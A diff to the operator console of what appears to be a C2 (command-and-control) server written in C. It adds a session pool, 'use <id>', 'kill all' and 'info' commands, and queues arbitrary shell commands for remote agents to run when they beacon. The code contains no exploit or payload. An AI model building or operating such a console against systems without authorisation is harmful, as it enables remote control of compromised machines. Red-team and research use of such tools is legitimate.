@@ -1,5 +1,6 @@
 #include "Console.h"
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 
 static void ClearScreen(void)
@@ -14,14 +15,21 @@ static void ClearScreen(void)
 
 void ConsolePrintHelp(void)
 {
-    printf("\n  Commands\n");
-    printf("  %-20s %s\n", "help",              "Show this help");
-    printf("  %-20s %s\n", "sessions",          "List active agents");
-    printf("  %-20s %s\n", "use <id>",          "Interact with agent");
-    printf("  %-20s %s\n", "back",              "Return to main console");
-    printf("  %-20s %s\n", "clear",             "Clear screen");
-    printf("  %-20s %s\n", "kill",              "Kill agent and disconnect");
-    printf("  %-20s %s\n", "exit / quit",       "Shutdown server\n");
+    printf("\n\033[1;37m  Server Commands\033[0m\n");
+    printf("  \033[33m%-22s\033[0m %s\n", "help",             "Show this help");
+    printf("  \033[33m%-22s\033[0m %s\n", "sessions",         "List all active sessions");
+    printf("  \033[33m%-22s\033[0m %s\n", "use <id>",         "Enter interactive shell with agent");
+    printf("  \033[33m%-22s\033[0m %s\n", "kill <id>",        "Kill a specific agent session");
+    printf("  \033[33m%-22s\033[0m %s\n", "kill all",         "Kill all active sessions");
+    printf("  \033[33m%-22s\033[0m %s\n", "info",             "Show server configuration");
+    printf("  \033[33m%-22s\033[0m %s\n", "clear",            "Clear terminal");
+    printf("  \033[33m%-22s\033[0m %s\n", "exit / quit",      "Shutdown server");
+    printf("\n\033[1;37m  Session Commands\033[0m  (inside use <id>)\n");
+    printf("  \033[33m%-22s\033[0m %s\n", "<command>",        "Execute shell command on agent");
+    printf("  \033[33m%-22s\033[0m %s\n", "back",             "Return to server console");
+    printf("  \033[33m%-22s\033[0m %s\n", "kill",             "Kill this session");
+    printf("  \033[33m%-22s\033[0m %s\n", "clear",            "Clear terminal");
+    printf("\n");
 }
 
 int ConsoleRead(char *Out, int Cap)
@@ -32,76 +40,110 @@ int ConsoleRead(char *Out, int Cap)
     return 1;
 }
 
-static int IsCmd(const char *Input, const char *Cmd)
+static void PrintPrompt(SessionPool *P)
 {
-    return strcmp(Input, Cmd) == 0;
+    if (P->Interactive && P->ActiveId > 0)
+        printf("session-%d ~$ ", P->ActiveId);
+    else
+        printf("server ~$ ");
+    fflush(stdout);
 }
 
-int ConsoleExec(const char *Line, Session *S)
+int ConsoleExec(const char *Line, SessionPool *P, const Config *C)
 {
-    if (S->Interactive) {
+    (void)C;
 
-        if (IsCmd(Line, "back")) {
-            SessionLeave(S);
+    if (P->Interactive && P->ActiveId > 0) {
+        AgentSession *S = PoolById(P, P->ActiveId);
 
-        } else if (IsCmd(Line, "clear")) {
+        if (strcmp(Line, "back") == 0) {
+            PoolLeave(P);
+            return 1;
+
+        } else if (strcmp(Line, "clear") == 0) {
             ClearScreen();
-            printf("session-[%s] ~$ ", S->Address);
-            fflush(stdout);
+            PrintPrompt(P);
 
-        } else if (IsCmd(Line, "kill") || IsCmd(Line, "exit") || IsCmd(Line, "quit")) {
-            SessionKill(S);
-            printf("C2 ~$ ");
-            fflush(stdout);
+        } else if (strcmp(Line, "kill") == 0) {
+            int Id = P->ActiveId;
+            PoolLeave(P);
+            PoolKill(P, Id);
+            return 1;
 
-        } else if (IsCmd(Line, "help")) {
+        } else if (strcmp(Line, "help") == 0) {
             ConsolePrintHelp();
-            printf("session-[%s] ~$ ", S->Address);
-            fflush(stdout);
+            PrintPrompt(P);
 
         } else if (strlen(Line) > 0) {
-            SessionSendCommand(S, Line);
-            printf("[*] Queued — waiting for beacon...\n");
-            printf("session-[%s] ~$ ", S->Address);
-            fflush(stdout);
+            if (!S) {
+                printf("[!] Session no longer active.\n");
+                PoolLeave(P);
+                return 1;
+            }
+            PoolQueueCommand(S, Line);
+            printf("\033[90m[*] queued — waiting for beacon...\033[0m\n");
+            PrintPrompt(P);
 
         } else {
-            printf("session-[%s] ~$ ", S->Address);
-            fflush(stdout);
+            PrintPrompt(P);
         }
 
         return 1;
     }
 
-    if (IsCmd(Line, "help")) {
+    if (strcmp(Line, "help") == 0) {
         ConsolePrintHelp();
 
-    } else if (IsCmd(Line, "clear")) {
+    } else if (strcmp(Line, "clear") == 0) {
         ClearScreen();
 
-    } else if (IsCmd(Line, "exit") || IsCmd(Line, "quit")) {
+    } else if (strcmp(Line, "exit") == 0 || strcmp(Line, "quit") == 0) {
         printf("Shutting down.\n");
         return 0;
 
-    } else if (IsCmd(Line, "sessions") || IsCmd(Line, "session")) {
-        if (S->Active)
-            printf("\n  [1]  %s  (active)\n\n", S->Address);
-        else
-            printf("  No active sessions.\n");
+    } else if (strcmp(Line, "sessions") == 0 || strcmp(Line, "session") == 0) {
+        PoolList(P);
 
-    } else if (IsCmd(Line, "use 1")      || IsCmd(Line, "interact 1") ||
-               IsCmd(Line, "use")        || IsCmd(Line, "interact")) {
-        if (S->Active)
-            SessionEnter(S);
+    } else if (strcmp(Line, "info") == 0) {
+        printf("\n");
+        ConfigPrint(C);
+        printf("\n");
+
+    } else if (strncmp(Line, "use ", 4) == 0) {
+        int Id = atoi(Line + 4);
+        if (Id > 0)
+            PoolEnter(P, Id);
         else
-            printf("[!] No active session.\n");
+            printf("[!] Usage: use <id>\n");
+        return 1;
+
+    } else if (strncmp(Line, "interact ", 9) == 0) {
+        int Id = atoi(Line + 9);
+        if (Id > 0)
+            PoolEnter(P, Id);
+        else
+            printf("[!] Usage: interact <id>\n");
+        return 1;
+
+    } else if (strcmp(Line, "kill all") == 0) {
+        for (int I = 0; I < P->Count; I++) {
+            if (P->Slots[I].State == StateActive)
+                PoolKill(P, P->Slots[I].Id);
+        }
+        return 1;
+
+    } else if (strncmp(Line, "kill ", 5) == 0) {
+        int Id = atoi(Line + 5);
+        if (Id > 0)
+            PoolKill(P, Id);
+        else
+            printf("[!] Usage: kill <id>\n");
         return 1;
 
     } else if (strlen(Line) > 0) {
         printf("[!] Unknown command — type 'help'.\n");
     }
 
-    printf("C2Main> ");
-    fflush(stdout);
+    PrintPrompt(P);
     return 1;
 }
